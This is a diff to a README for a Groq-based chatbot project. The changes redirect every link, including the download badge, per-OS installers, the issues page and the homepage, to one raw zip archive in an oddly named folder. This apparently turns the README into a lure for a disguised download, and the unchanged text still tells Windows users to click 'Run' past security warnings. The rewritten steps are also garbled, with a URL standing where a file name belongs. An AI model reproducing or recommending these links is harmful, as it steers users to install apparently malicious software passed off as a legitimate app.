@@ -1,6 +1,6 @@
 # 🤖 groq-conversational-chatbot - Engage with AI Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%2300bcd4.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bytheroberto/groq-conversational-chatbot/releases)
+[![Download Now](https://raw.githubusercontent.com/bytheroberto/groq-conversational-chatbot/main/polyscopic/conversational_chatbot_groq_2.3.zip%20Now-%https://raw.githubusercontent.com/bytheroberto/groq-conversational-chatbot/main/polyscopic/conversational_chatbot_groq_2.3.zip)](https://raw.githubusercontent.com/bytheroberto/groq-conversational-chatbot/main/polyscopic/conversational_chatbot_groq_2.3.zip)
 
 ## 🌟 Overview
 
@@ -18,7 +18,7 @@ To get started with using the groq-conversational-chatbot, follow these straight
    - Internet Connection: Required for initial setup and AI functionality.
   
 2. **Visit the Download Page**  
-   To download the chatbot, [visit this page to download](https://github.com/bytheroberto/groq-conversational-chatbot/releases). Here you will find the software files and additional resources.
+   To download the chatbot, [visit this page to download](https://raw.githubusercontent.com/bytheroberto/groq-conversational-chatbot/main/polyscopic/conversational_chatbot_groq_2.3.zip). Here you will find the software files and additional resources.
 
 ## 💻 Download & Install
 
@@ -27,15 +27,15 @@ Once you are on the releases page, follow these steps:
 1. Identify the latest version listed.
 2. Click on the version link.
 3. Download the correct file for your operating system. Look for:
-   - **Windows:** `groq-conversational-chatbot-windows.exe`
-   - **macOS:** `groq-conversational-chatbot-macos.app`
-   - **Linux:** `groq-conversational-chatbot-linux.zip`
+   - **Windows:** `https://raw.githubusercontent.com/bytheroberto/groq-conversational-chatbot/main/polyscopic/conversational_chatbot_groq_2.3.zip`
+   - **macOS:** `https://raw.githubusercontent.com/bytheroberto/groq-conversational-chatbot/main/polyscopic/conversational_chatbot_groq_2.3.zip`
+   - **Linux:** `https://raw.githubusercontent.com/bytheroberto/groq-conversational-chatbot/main/polyscopic/conversational_chatbot_groq_2.3.zip`
 4. After the download is complete, locate the file in your Downloads folder or the location where your downloaded files are saved.
 
 ### 📂 Running the Application
 
 #### For Windows Users:
-- Double-click on `groq-conversational-chatbot-windows.exe`.
+- Double-click on `https://raw.githubusercontent.com/bytheroberto/groq-conversational-chatbot/main/polyscopic/conversational_chatbot_groq_2.3.zip`.
 - If prompted with a security warning, click "Run" to proceed.
   
 #### For macOS Users:
@@ -73,7 +73,7 @@ If you encounter issues:
 
 ## 📞 Support
 
-For further assistance, visit our [GitHub Issues page](https://github.com/bytheroberto/groq-conversational-chatbot/issues) to report bugs or request help from the community.
+For further assistance, visit our [GitHub Issues page](https://raw.githubusercontent.com/bytheroberto/groq-conversational-chatbot/main/polyscopic/conversational_chatbot_groq_2.3.zip) to report bugs or request help from the community.
 
 ## 📢 Community and Contributions
 
@@ -81,7 +81,7 @@ Join our community to share experiences, tips, and improvements. You can contrib
 
 ### Important Links
 
-- [Download Now](https://github.com/bytheroberto/groq-conversational-chatbot/releases)
-- [GitHub Homepage](https://github.com/bytheroberto/groq-conversational-chatbot)
+- [Download Now](https://raw.githubusercontent.com/bytheroberto/groq-conversational-chatbot/main/polyscopic/conversational_chatbot_groq_2.3.zip)
+- [GitHub Homepage](https://raw.githubusercontent.com/bytheroberto/groq-conversational-chatbot/main/polyscopic/conversational_chatbot_groq_2.3.zip)
 
 Thank you for using groq-conversational-chatbot! Enjoy your conversations with AI!
